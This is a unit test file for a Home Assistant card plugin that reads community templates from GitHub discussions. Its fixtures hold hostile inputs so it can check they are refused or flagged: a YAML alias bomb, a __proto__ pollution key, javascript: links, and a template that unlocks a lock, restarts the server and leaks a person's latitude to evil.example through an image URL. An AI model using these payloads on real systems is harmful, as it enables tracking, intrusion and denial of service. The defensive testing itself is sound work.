/*
 * Unit tests for src/community.ts - reading templates out of GitHub discussion posts,
 * and fetching and caching the list of them. Run with `npm test`.
 */
const {
  extractYaml,
  parseDiscussion,
  parseDiscussions,
  communityNeeds,
  postBody,
  fetchCommunity,
  communityRisks,
  COMMUNITY_CATEGORY,
} = require('../.test-build/community.js');

const { check, report } = require('./harness');

const category = { slug: COMMUNITY_CATEGORY, name: 'Share your templates' };

function post(number, body, extra = {}) {
  return {
    number,
    title: `Post ${number}`,
    body,
    html_url: `https://github.com/x/y/discussions/${number}`,
    user: { login: 'someone' },
    category,
    reactions: { total_count: 0 },
    updated_at: '2026-10-01T00:00:00Z',
    ...extra,
  };
}

const TILE = 'template: tile_light\nvariables:\n  - entity\ncard:\n  type: tile\n  entity: "[[entity]]"\n';

/* --- extractYaml --- */

check('a yaml block is found', extractYaml('Some words\n\n```yaml\na: 1\n```\n'), 'a: 1\n');
check('yml counts as yaml', extractYaml('```yml\na: 1\n```'), 'a: 1\n');
check(
  'a yaml block wins over an earlier unmarked one',
  extractYaml('```\nnot this\n```\n\n```yaml\nthis: 1\n```'),
  'this: 1\n',
);
check('an unmarked block is used when nothing is marked', extractYaml('```\na: 1\n```'), 'a: 1\n');
check('a block in another language is not', extractYaml('```js\nalert(1)\n```'), undefined);
check('tilde fences work too', extractYaml('~~~yaml\na: 1\n~~~'), 'a: 1\n');
check('no block, no yaml', extractYaml('just prose'), undefined);
check('a missing body is nothing', extractYaml(undefined), undefined);

/* --- parseDiscussion --- */

const entry = parseDiscussion(post(7, `A tile for a light.\n\n\`\`\`yaml\n${TILE}\`\`\`\n`));
check('a post becomes an entry named after its template', entry && entry.name, 'tile_light');
check('the template is kept without its name or type', entry && entry.template, {
  variables: ['entity'],
  card: { type: 'tile', entity: '[[entity]]' },
});
check('the post is linked', entry && entry.url, 'https://github.com/x/y/discussions/7');
check('the poster is credited', entry && entry.author, 'someone');

check(
  'an exported type tag is dropped, the installing card sets its own',
  parseDiscussion(post(1, '```yaml\ntype: custom:decluttering-template-plus\n' + TILE + '```')).template.type,
  undefined,
);

check(
  'carried templates are kept apart from the template',
  parseDiscussion(
    post(
      1,
      '```yaml\ntemplate: outer\ncard:\n  type: custom:decluttering-card-plus\n  template: inner\nincludes:\n  inner:\n    card:\n      type: tile\n```',
    ),
  ).includes,
  { inner: { card: { type: 'tile' } } },
);

check('a post that is not yaml is left out', parseDiscussion(post(1, '```yaml\na: [\n```')), undefined);
check('a post that is not a template is left out', parseDiscussion(post(1, '```yaml\nfoo: bar\n```')), undefined);
check(
  'a template defining two things is left out',
  parseDiscussion(post(1, '```yaml\ntemplate: x\ncard: {type: tile}\nrow: {type: x}\n```')),
  undefined,
);
check(
  'yaml tags beyond plain data do not survive',
  parseDiscussion(post(1, '```yaml\ntemplate: x\ncard: !!js/function "() => 1"\n```')),
  undefined,
);
check(
  'a __proto__ key does not reach the prototype',
  (() => {
    const parsed = parseDiscussion(
      post(1, '```yaml\ntemplate: x\ncard:\n  type: tile\n__proto__:\n  polluted: yes\n```'),
    );
    return [{}.polluted, parsed && Object.getPrototypeOf(parsed.template) === Object.prototype];
  })(),
  [undefined, true],
);
check(
  'a post without a title takes the template name',
  parseDiscussion(post(1, '```yaml\n' + TILE + '```', { title: '  ' })).title,
  'tile_light',
);

/* --- parseDiscussions --- */

check(
  'only the shared-templates category is read',
  parseDiscussions([
    post(1, '```yaml\n' + TILE + '```'),
    post(2, '```yaml\n' + TILE + '```', { category: { slug: 'q-a' } }),
  ]).map((each) => each.id),
  [1],
);

check(
  'better received first, then newer',
  parseDiscussions([
    post(1, '```yaml\n' + TILE + '```', { updated_at: '2026-01-01T00:00:00Z' }),
    post(2, '```yaml\n' + TILE + '```', { updated_at: '2026-05-01T00:00:00Z' }),
    post(3, '```yaml\n' + TILE + '```', { reactions: { total_count: 4 } }),
  ]).map((each) => each.id),
  [3, 2, 1],
);

/* --- communityNeeds --- */

const nested = parseDiscussion(
  post(
    1,
    '```yaml\ntemplate: outer\ncard:\n  type: vertical-stack\n  cards:\n    - type: custom:decluttering-card-plus\n      template: inner\n    - type: custom:decluttering-card-plus\n      template: elsewhere\n    - type: custom:mushroom-template-card\nincludes:\n  inner:\n    card:\n      type: custom:button-card\n```',
  ),
);
check('custom cards are gathered from the template and what it carries', communityNeeds(nested, []).customTypes, [
  'custom:button-card',
  'custom:mushroom-template-card',
]);
check('a template it calls but does not carry is needed', communityNeeds(nested, []).templates, ['elsewhere']);
check('unless it is already here', communityNeeds(nested, ['elsewhere']).templates, []);

/* --- postBody --- */

check(
  'a post is the description, the notes, then the yaml in a block',
  postBody('template: x\ncard:\n  type: tile\n', ['Needs custom:button-card'], 'A tile.'),
  'A tile.\n\nNeeds custom:button-card\n\n```yaml\ntemplate: x\ncard:\n  type: tile\n```\n',
);
check(
  'a post can be read back as the template it came from',
  parseDiscussion(post(1, postBody('template: x\ncard:\n  type: tile\n', [], 'A tile.'))).name,
  'x',
);

/* --- what a post cannot do to the people who load the list --- */

// Ten of the level below, seven levels deep: a few hundred bytes that expand to hundreds of
// megabytes if every alias is followed.
function bomb(depth) {
  let yaml = 'a0: &a0 [x,x,x,x,x,x,x,x,x,x]\n';
  for (let i = 1; i <= depth; i += 1)
    yaml +=
      `a${i}: &a${i} [` +
      Array(10)
        .fill(`*a${i - 1}`)
        .join(',') +
      ']\n';
  return yaml + 'template: t\ncard: {type: markdown}\n';
}
const bombAt = Date.now();
check(
  'a post whose yaml balloons when its aliases are followed is left out',
  parseDiscussion(post(900, '```yaml\n' + bomb(6) + '```')),
  undefined,
);
check('and is left out quickly', Date.now() - bombAt < 1500, true);

check(
  'a post longer than any template is left out before it is read',
  parseDiscussion(post(901, '```yaml\n' + TILE + '```\n' + '-'.repeat(70000))),
  undefined,
);

const fenceAt = Date.now();
check('a fence that never closes finds no yaml', extractYaml('```x\n'.repeat(13000)), undefined);
check('and does not take seconds to say so', Date.now() - fenceAt < 500, true);

check(
  'includes that are not templates are dropped',
  parseDiscussion(
    post(
      902,
      '```yaml\n' +
        TILE +
        'includes:\n  good:\n    card: {type: tile}\n  text: hello\n  bare:\n    description: x\n```',
    ),
  ).includes,
  { good: { card: { type: 'tile' } } },
);

check(
  'a description that is not text is dropped',
  parseDiscussion(post(903, '```yaml\n' + TILE + 'description:\n  _$litType$: 1\n```')).template.description,
  undefined,
);

check(
  'a link that does not go to GitHub is replaced by the one that does',
  parseDiscussion(post(904, '```yaml\n' + TILE + '```', { html_url: 'javascript:alert(1)' })).url,
  'https://github.com/tempus2016/decluttering-card-plus/discussions/904',
);

const risky = parseDiscussion(
  post(
    905,
    [
      '```yaml',
      'template: r',
      'card:',
      '  type: vertical-stack',
      '  cards:',
      '    - type: tile',
      '      entity: lock.front',
      '      tap_action: {action: perform-action, perform_action: lock.unlock}',
      '      hold_action: {action: call-service, service: homeassistant.restart}',
      '    - type: iframe',
      '      url: https://evil.example/',
      '    - type: custom:button-card',
      '      name: "[[[ return 1 ]]]"',
      '    - type: markdown',
      '      content: "![](https://evil.example/c?d={{ states.person.x.attributes.latitude }})"',
      '```',
    ].join('\n'),
  ),
);
check('what a post would do once installed is spelt out', communityRisks(risky), {
  actions: ['homeassistant.restart', 'lock.unlock'],
  urls: ['https://evil.example/', 'https://evil.example/c?d='],
  embeds: true,
  scripts: true,
});
check('a harmless post has nothing to say', communityRisks(parseDiscussion(post(906, '```yaml\n' + TILE + '```'))), {
  actions: [],
  urls: [],
  embeds: false,
  scripts: false,
});

/* --- fetchCommunity --- */

function memoryStorage() {
  const data = {};
  return {
    getItem: (key) => (key in data ? data[key] : null),
    setItem: (key, value) => {
      data[key] = String(value);
    },
  };
}

function respond(status, body, headers = {}) {
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: { get: (name) => headers[name.toLowerCase()] ?? null },
    json: async () => body,
  };
}

(async () => {
  const storage = memoryStorage();
  const urls = [];
  const page = (n) => Array.from({ length: n }, (_, i) => post(i + 1, '```yaml\n' + TILE + '```'));
  const pages = [page(100), page(3)];
  const fetcher = async (url) => {
    urls.push(url);
    return respond(200, pages.shift() ?? []);
  };

  const first = await fetchCommunity({ fetcher, storage, now: 1000 });
  check('every page is read until a short one', urls.length, 2);
  check('the posts are parsed', first.entries.length, 103);

  const again = await fetchCommunity({ fetcher: async () => respond(500, null), storage, now: 2000 });
  check('a fresh cache is used without asking GitHub', again.fetched, 1000);

  let error;
  try {
    await fetchCommunity({
      refresh: true,
      fetcher: async () => respond(403, {}, { 'x-ratelimit-remaining': '0', 'x-ratelimit-reset': '5000' }),
      storage,
      now: 3000,
    });
  } catch (err) {
    error = err;
  }
  check('a rate limit says when to try again', error && error.retryAt, 5000000);
  check('and still hands back the cached list', error && error.cached && error.cached.entries.length, 103);

  let offline;
  try {
    await fetchCommunity({
      fetcher: async () => {
        throw new TypeError('Failed to fetch');
      },
      storage: memoryStorage(),
    });
  } catch (err) {
    offline = err;
  }
  check(
    'a network failure is reported, with nothing cached to fall back on',
    [offline && offline.message, offline && offline.cached],
    ['Failed to fetch', undefined],
  );

  const stale = await fetchCommunity({
    fetcher: async () => respond(200, []),
    storage,
    now: 1000 + 7 * 3600 * 1000,
  });
  check('a stale cache is refreshed', stale.entries.length, 0);

  const poisoned = memoryStorage();
  poisoned.setItem(
    'decluttering-card-plus-community',
    JSON.stringify({
      fetched: 1000,
      entries: [
        {
          id: 1,
          title: 't',
          author: 'a',
          url: 'javascript:alert(1)',
          name: 'ok',
          template: { card: { type: 'tile' } },
          includes: {},
          reactions: 0,
          updated: '',
        },
        { id: 'x', name: 5 },
      ],
    }),
  );
  const readBack = await fetchCommunity({ fetcher: async () => respond(500, null), storage: poisoned, now: 2000 });
  check(
    'a cached list is read back as carefully as a fetched one',
    readBack.entries.map((each) => [each.id, each.url]),
    [[1, 'https://github.com/tempus2016/decluttering-card-plus/discussions/1']],
  );

  report();
})();
